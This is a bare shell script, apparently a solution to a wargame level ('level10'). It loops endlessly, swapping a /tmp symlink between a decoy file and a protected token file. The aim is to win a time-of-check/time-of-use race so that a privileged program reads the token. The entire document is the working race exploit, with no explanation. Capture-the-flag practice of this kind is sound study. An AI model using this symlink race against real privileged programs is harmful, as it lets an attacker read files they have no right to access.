#!/bin/sh

while true
    do
        echo "MY LINK"
        ln -sf /tmp/faketoken /tmp/link
        echo "TOKEN LINK"
        ln -sf /home/user/level10/token /tmp/link
    done
